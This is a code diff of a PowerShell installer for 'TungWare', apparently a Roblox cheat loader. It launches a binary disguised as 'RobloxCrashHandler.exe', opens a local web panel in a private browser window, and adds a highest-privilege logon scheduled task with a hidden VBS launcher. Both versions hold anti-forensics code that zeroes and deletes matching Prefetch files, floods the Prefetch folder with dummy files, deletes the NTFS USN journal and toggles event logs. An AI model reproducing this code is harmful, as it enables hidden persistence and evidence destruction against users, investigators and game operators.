-    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\TungWarePortal.url",
-    "$env:USERPROFILE\.tungware_bootstrap.ps1",
-    "$env:USERPROFILE\.tungware_key",
-    "$env:USERPROFILE\.tungware_persistence"
-) | ForEach-Object { if (Test-Path $_) { Remove-Item $_ -Force -ErrorAction SilentlyContinue } }
-
-Write-Host "Waiting for loader to initialize on port 9876..." -ForegroundColor Yellow
-$started = $false
-for ($i = 0; $i -lt 20; $i++) {
-    try {
-        $c = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9876)
-        $c.Close()
-        $started = $true
-        break
-    } catch { Start-Sleep -Seconds 1 }
-}
-
-function Start-PrivateBrowser([string]$url) {
-    $progId = ""
-    try {
-        $progId = (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice" -Name "ProgId" -ErrorAction SilentlyContinue).ProgId
-    } catch {}
-
-    $browser = ""
-    $arguments = ""
-
-    if ($progId -like "*Chrome*") {
-        $browser = "chrome.exe"
-        $arguments = "--incognito `"$url`""
-    } elseif ($progId -like "*MSEdge*" -or $progId -like "*Edge*") {
-        $browser = "msedge.exe"
-        $arguments = "-inprivate `"$url`""
-    } elseif ($progId -like "*Firefox*") {
-        $browser = "firefox.exe"
-        $arguments = "-private-window `"$url`""
-    } elseif ($progId -like "*Opera*") {
-        $browser = "opera.exe"
-        $arguments = "--private `"$url`""
+        Log-Msg "Loader running successfully."
     }
 
-    if (-not $browser) {
-        if (Get-Command "chrome.exe" -ErrorAction SilentlyContinue) {
+    if (-not $Silent) {
+        Log-Msg "Configuring fileless startup..."
+        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+
+        if ($Persist) {
+            $vbsPath = Join-Path $resolvedPath "silent_loader.vbs"
+            $vbsContent = @"
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+strScriptPath = objFSO.GetParentFolderName(WScript.ScriptFullName)
+
+strExePath = ""
+arrPaths = Array( _
+    strScriptPath & "\build\RobloxCrashHandler.exe", _
+    strScriptPath & "\build\RobloxCrashHandler_fallback.exe", _
+    strScriptPath & "\updates-server\uploads\RobloxCrashHandler.exe", _
+    objShell.ExpandEnvironmentStrings("%TEMP%") & "\RobloxCrashHandler_fallback.exe" _
+)
+
+For Each path In arrPaths
+    If objFSO.FileExists(path) Then
+        strExePath = path
+        Exit For
+    End If
+Next
+
+If strExePath <> "" Then
+    objShell.Run """" & strExePath & """", 0, False
+End If
+"@
+            [System.IO.File]::WriteAllText($vbsPath, $vbsContent)
+
+            $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
+            $trigger = New-ScheduledTaskTrigger -AtLogon
+            $principal = New-ScheduledTaskPrincipal -UserId $currentUser -RunLevel Highest -LogonType Interactive
+            Register-ScheduledTask -TaskName $LoaderTaskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
+
+            Log-Msg "Loader startup task registered."
+            
+            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TungWarePortal" -Force -ErrorAction SilentlyContinue | Out-Null
+        } else {
+            Log-Msg "Persistence disabled: Cleaning up scheduled tasks and registry keys..."
+            $vbsPath = Join-Path $resolvedPath "silent_loader.vbs"
+            if (Test-Path $vbsPath) { Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue }
+            Unregister-ScheduledTask -TaskName $LoaderTaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
+            Unregister-ScheduledTask -TaskName $PersistTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
+            Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TungWarePortal" -Force -ErrorAction SilentlyContinue | Out-Null
+        }
+
+        @(
+            "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\TungWarePortal.lnk",
+            "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\TungWarePortal.url",
+            "$env:USERPROFILE\.tungware_bootstrap.ps1",
+            "$env:USERPROFILE\.tungware_key",
+            "$env:USERPROFILE\.tungware_persistence"
+        ) | ForEach-Object { if (Test-Path $_) { Remove-Item $_ -Force -ErrorAction SilentlyContinue } }
+    } else {
+        Log-Msg "Silent mode: skipping fileless startup task configuration/reregistration."
+    }
+
+    Log-Msg "Waiting for loader to initialize on port 9876..."
+    $started = $false
+    for ($i = 0; $i -lt 20; $i++) {
+        try {
+            $c = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9876)
+            $c.Close()
+            $started = $true
+            break
+        } catch { Start-Sleep -Seconds 1 }
+    }
+
+    function Start-PrivateBrowser([string]$url) {
+        $progId = ""
+        try {
+            $progId = (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice" -Name "ProgId" -ErrorAction SilentlyContinue).ProgId
+        } catch {}
+
+        $browser = ""
+        $arguments = ""
+
+        if ($progId -like "*Chrome*") {
             $browser = "chrome.exe"
             $arguments = "--incognito `"$url`""
-        } elseif (Get-Command "msedge.exe" -ErrorAction SilentlyContinue) {
+        } elseif ($progId -like "*MSEdge*" -or $progId -like "*Edge*") {
             $browser = "msedge.exe"
             $arguments = "-inprivate `"$url`""
-        } elseif (Get-Command "firefox.exe" -ErrorAction SilentlyContinue) {
+        } elseif ($progId -like "*Firefox*") {
             $browser = "firefox.exe"
             $arguments = "-private-window `"$url`""
-        } else {
+        } elseif ($progId -like "*Opera*") {
+            $browser = "opera.exe"
+            $arguments = "--private `"$url`""
+        }
+
+        if (-not $browser) {
+            if (Get-Command "chrome.exe" -ErrorAction SilentlyContinue) {
+                $browser = "chrome.exe"
+                $arguments = "--incognito `"$url`""
+            } elseif (Get-Command "msedge.exe" -ErrorAction SilentlyContinue) {
+                $browser = "msedge.exe"
+                $arguments = "-inprivate `"$url`""
+            } elseif (Get-Command "firefox.exe" -ErrorAction SilentlyContinue) {
+                $browser = "firefox.exe"
+                $arguments = "-private-window `"$url`""
+            } else {
+                Start-Process $url
+                return
+            }
+        }
+
+        try {
+            Start-Process $browser -ArgumentList $arguments -ErrorAction Stop
+        } catch {
             Start-Process $url
-            return
         }
     }
+
+    if ($started) {
+        Log-Msg "Loader is running and awaiting activation."
+    } else {
+        Log-Msg "WARNING: Loader did not respond within 20 seconds."
+    }
+
+    try { wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:true 2>$null } catch {}
+    try { wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:true 2>$null } catch {}
 
     try {
-        Start-Process $browser -ArgumentList $arguments -ErrorAction Stop
-    } catch {
-        Start-Process $url
-    }
+        $pfDir = "$env:SystemRoot\Prefetch"
+        if (Test-Path $pfDir) {
+            $pfMatched = Get-ChildItem -Path $pfDir -Filter "*.pf" -ErrorAction SilentlyContinue | Where-Object {
+                $_.Name -like "*Roblox*" -or $_.Name -like "*TUNG*" -or $_.Name -like "*POWERSHELL*" -or $_.Name -like "*WSCRIPT*" -or $_.Name -like "*DLLHOST*" -or $_.Name -like "*INSTALLER*" -or $_.Name -like "*SETUP*"
+            }
+            foreach ($pf in $pfMatched) {
+                try {
+                    $len = $pf.Length
+                    if ($len -gt 0) {
+                        [System.IO.File]::WriteAllBytes($pf.FullName, (New-Object byte[] $len))
+                    }
+                } catch {}
+                Remove-Item -Path $pf.FullName -Force -ErrorAction SilentlyContinue
+            }
+            for ($i = 0; $i -lt 50; $i++) {
+                $dummy = Join-Path $pfDir "tmp_$([System.IO.Path]::GetRandomFileName()).tmp"
+                try {
+                    [System.IO.File]::WriteAllText($dummy, "0")
+                    Remove-Item -Path $dummy -Force -ErrorAction SilentlyContinue
+                } catch {}
+            }
+        }
+        cmd.exe /c "fsutil usn deletejournal /D C:" | Out-Null
+        cmd.exe /c "fsutil usn createjournal m=33554432 a=8388608 C:" | Out-Null
+    } catch {}
+
+    # ── Mark install complete (one-time-ever flag) ───────────────────────────
+    New-Item -Path $KeyRegPath -Force -ErrorAction SilentlyContinue | Out-Null
+    Set-ItemProperty -Path $KeyRegPath -Name "InstallComplete" -Value "1" -Force
+    Log-Msg "InstallComplete flag written to registry. Setup will not run again."
+
+    Log-Msg "SUCCESS: Install complete! Press CapsLock + Enter to launch, Insert to toggle menu."
+} catch {
+    Log-Msg "FATAL ERROR: $_"
+    Log-Msg $_.ScriptStackTrace
+    throw $_
 }
-if (-not $started) {
-    Write-Host "Loader port 9876 not active yet, launching binary directly..." -ForegroundColor Yellow
-    if ($localExe -and (Test-Path $localExe)) {
-        Start-Process -FilePath $localExe -WindowStyle Hidden
-    } else {
-        $directCandidates = @(
-            (Join-Path $resolvedPath "my private\build\RobloxCrashHandler.exe"),
-            (Join-Path $scriptRoot "my private\build\RobloxCrashHandler.exe"),
-            (Join-Path $resolvedPath "build\RobloxCrashHandler.exe")
-        )
-        $directBin = $directCandidates | Where-Object { Test-Path $_ } | Select-Object -First 1
-        if ($directBin) { Start-Process -FilePath $directBin -WindowStyle Hidden }
-    }
-    Start-Sleep -Seconds 2
-}
 
-Write-Host "Opening website in browser..." -ForegroundColor Green
-Start-PrivateBrowser "http://127.0.0.1:9876"
-
-wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:true 2>$null
-wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:true 2>$null
-
-try {
-    $pfDir = "$env:SystemRoot\Prefetch"
-    if (Test-Path $pfDir) {
-        $pfMatched = Get-ChildItem -Path $pfDir -Filter "*.pf" -ErrorAction SilentlyContinue | Where-Object {
-            $_.Name -like "*Roblox*" -or $_.Name -like "*TUNG*" -or $_.Name -like "*POWERSHELL*" -or $_.Name -like "*WSCRIPT*" -or $_.Name -like "*DLLHOST*" -or $_.Name -like "*INSTALLER*" -or $_.Name -like "*SETUP*"
-        }
-        foreach ($pf in $pfMatched) {
-            try {
-                $len = $pf.Length
-                if ($len -gt 0) {
-                    [System.IO.File]::WriteAllBytes($pf.FullName, (New-Object byte[] $len))
-                }
-            } catch {}
-            Remove-Item -Path $pf.FullName -Force -ErrorAction SilentlyContinue
-        }
-        for ($i = 0; $i -lt 50; $i++) {
-            $dummy = Join-Path $pfDir "tmp_$([System.IO.Path]::GetRandomFileName()).tmp"
-            try {
-                [System.IO.File]::WriteAllText($dummy, "0")
-                Remove-Item -Path $dummy -Force -ErrorAction SilentlyContinue
-            } catch {}
-        }
-    }
-    cmd.exe /c "fsutil usn deletejournal /D C:" | Out-Null
-    cmd.exe /c "fsutil usn createjournal m=33554432 a=8388608 C:" | Out-Null
-} catch {}
-
-Write-Host "==========================================" -ForegroundColor Green
-Write-Host "  SUCCESS: Install complete!              " -ForegroundColor Green
-Write-Host "  Activate from the website at 127.0.0.1 " -ForegroundColor Cyan
-Write-Host "==========================================" -ForegroundColor Green
